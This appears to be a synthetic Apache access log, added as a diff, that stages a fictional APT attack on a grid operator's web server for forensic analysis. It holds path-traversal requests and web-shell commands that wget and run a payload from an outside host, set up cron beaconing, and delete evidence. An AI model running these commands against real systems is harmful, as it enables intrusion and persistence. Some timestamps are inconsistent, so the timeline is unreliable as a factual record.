@@ -1,0 +1,50 @@
+# Apache Access Log - GridSecure Industries
+# Iron Storm APT Attack Timeline
+
+# Phase 1: Reconnaissance (00:00 - 06:00 UTC)
+172.16.0.34 - - [10/Oct/2023:00:06:53 +0000] "POST /api/scada/metrics HTTP/1.1" 403 0 "Industroyer/2.0"
+203.0.113.42 - - [10/Oct/2023:00:14:27 +0000] "POST /api/modbus/read HTTP/1.1" 404 0 "Triton/3.0"
+203.0.113.25 - - [10/Oct/2023:00:34:39 +0000] "POST /api/bacnet/discover HTTP/1.1" 404 0 "NotPetya/2.0"
+203.0.113.67 - - [10/Oct/2023:01:15:45 +0000] "POST /api/cip/read HTTP/1.1" 404 0 "CIP Protocol Scanner/2.1"
+172.16.0.12 - - [10/Oct/2023:01:45:59 +0000] "POST /control_systems/hmi_interface.xml HTTP/1.1" 403 0 "Profinet Security Tool/3.0"
+10.0.0.34 - - [10/Oct/2023:02:30:42 +0000] "POST /control_systems/hmi_interface.xml HTTP/1.1" 404 0 "HMI Interface Scanner/2.1"
+192.168.1.23 - - [10/Oct/2023:03:00:33 +0000] "POST /classified/transformer_monitoring.json HTTP/1.1" 403 0 "Transformer Monitoring Tool/2.0"
+192.168.1.123 - - [10/Oct/2023:06:15:48 +0000] "POST /api/dnp3/control HTTP/1.1" 403 0 "Flame/3.0"
+172.16.0.34 - - [10/Oct/2023:06:22:51 +0000] "POST /api/s7comm/write HTTP/1.1" 403 0 "BlackEnergy/3.0"
+203.0.113.10 - - [10/Oct/2023:07:00:59 +0000] "POST /control_systems/plc_scan HTTP/1.1" 404 0 "ICS Security Audit Tool/2.1"
+192.168.1.45 - - [10/Oct/2023:07:06:59 +0000] "POST /api/bacnet/write HTTP/1.1" 403 0 "Modbus Security Scanner/2.0"
+172.16.0.34 - - [10/Oct/2023:08:13:03 +0000] "POST /api/ics/command HTTP/1.1" 403 0 "APT33/Shamoon/3.0"
+172.16.0.34 - - [10/Oct/2023:08:17:27 +0000] "POST /api/modbus/scan HTTP/1.1" 403 0 "Lazarus/HiddenCobra/2.1"
+203.0.113.10 - - [10/Oct/2023:09:15:59 +0000] "POST /control_systems/device_scan HTTP/1.1" 404 0 "SCADA Network Scanner/3.1"
+192.168.1.45 - - [10/Oct/2023:09:45:59 +0000] "POST /api/bacnet/enumerate HTTP/1.1" 403 0 "Power Grid Assessment Tool/2.1"
+
+# Phase 2: Initial Access (06:13 UTC)
+203.0.113.77 - - [10/Oct/2023:06:13:00 +0000] "GET /download?file=../../../etc/passwd HTTP/1.1" 200 2345 "curl/7.68.0"
+203.0.113.77 - - [10/Oct/2023:06:13:15 +0000] "GET /download?file=../../../var/www/html/classified/operator_access.txt HTTP/1.1" 200 1024 "curl/7.68.0"
+
+# Phase 3: Malware Delivery & Execution (06:14 - 06:15 UTC)
+203.0.113.77 - - [10/Oct/2023:06:14:00 +0000] "POST /download?file=../../../var/www/html/shell.php HTTP/1.1" 200 45 "curl/7.68.0"
+203.0.113.77 - - [10/Oct/2023:06:14:15 +0000] "GET /shell.php?cmd=wget%20http://203.0.113.195:8080/libc.so.6%20-O%20/tmp/libc.so.6 HTTP/1.1" 200 0 "curl/7.68.0"
+203.0.113.77 - - [10/Oct/2023:06:14:30 +0000] "GET /shell.php?cmd=chmod%20+x%20/tmp/libc.so.6%20%26%26%20/tmp/libc.so.6 HTTP/1.1" 500 0 "curl/7.68.0"
+203.0.113.77 - - [10/Oct/2023:06:14:45 +0000] "GET /shell.php?cmd=systemctl%20start%20/tmp/libc.so.6 HTTP/1.1" 500 0 "curl/7.68.0"
+203.0.113.77 - - [10/Oct/2023:06:15:00 +0000] "GET /shell.php?cmd=echo%20'*/5%20*%20*%20*%20*%20/tmp/libc.so.6'%20%7C%20crontab%20- HTTP/1.1" 200 0 "curl/7.68.0"
+
+# Phase 4: Data Exfiltration (06:15 - 06:16 UTC)
+203.0.113.77 - - [10/Oct/2023:06:15:15 +0000] "GET /download?file=../../../var/www/html/classified/grid_topology.rar HTTP/1.1" 200 2048576 "curl/7.68.0"
+203.0.113.77 - - [10/Oct/2023:06:15:30 +0000] "GET /download?file=../../../var/www/html/classified/scada_configs.zip HTTP/1.1" 200 512000 "curl/7.68.0"
+203.0.113.77 - - [10/Oct/2023:06:15:45 +0000] "GET /download?file=../../../var/www/html/includes/config/backup/config.php HTTP/1.1" 200 2048 "curl/7.68.0"
+
+# Phase 5: Persistence Establishment (06:16 - 06:17 UTC)
+203.0.113.77 - - [10/Oct/2023:06:16:00 +0000] "POST /download?file=../../../var/www/html/includes/backdoor.php HTTP/1.1" 200 1024 "curl/7.68.0"
+203.0.113.77 - - [10/Oct/2023:06:16:15 +0000] "GET /shell.php?cmd=echo%20'*/2%20*%20*%20*%20*%20curl%20-s%20http://203.0.113.195:8080/heartbeat?token=GRIDSECURE_HEARTBEAT_2024%26id=gridsecure_server'%20%7C%20crontab%20- HTTP/1.1" 200 0 "curl/7.68.0"
+
+# Phase 6: Anti-Forensic Operations (06:17 - 06:18 UTC)
+203.0.113.77 - - [10/Oct/2023:06:17:00 +0000] "GET /shell.php?cmd=rm%20-f%20/tmp/libc.so.6 HTTP/1.1" 200 0 "curl/7.68.0"
+203.0.113.77 - - [10/Oct/2023:06:17:15 +0000] "GET /shell.php?cmd=rm%20-f%20/tmp/libc.so.6 HTTP/1.1" 200 0 "curl/7.68.0"
+203.0.113.77 - - [10/Oct/2023:06:17:30 +0000] "GET /shell.php?cmd=find%20/tmp%20-name%20'libc.so*'%20-delete HTTP/1.1" 200 0 "curl/7.68.0"
+203.0.113.77 - - [10/Oct/2023:06:17:45 +0000] "GET /shell.php?cmd=find%20/tmp%20-name%20'libc.so*'%20-delete HTTP/1.1" 200 0 "curl/7.68.0"
+
+# Post-Attack Activity (06:18+ UTC)
+203.0.113.77 - - [10/Oct/2023:06:18:00 +0000] "GET /backdoor.php?action=heartbeat&token=GRIDSECURE_HEARTBEAT_2024 HTTP/1.1" 200 45 "curl/7.68.0"
+203.0.113.77 - - [10/Oct/2023:06:20:00 +0000] "GET /backdoor.php?action=heartbeat&token=GRIDSECURE_HEARTBEAT_2024 HTTP/1.1" 200 45 "curl/7.68.0"
+203.0.113.77 - - [10/Oct/2023:06:22:00 +0000] "GET /backdoor.php?action=heartbeat&token=GRIDSECURE_HEARTBEAT_2024 HTTP/1.1" 200 45 "curl/7.68.0"
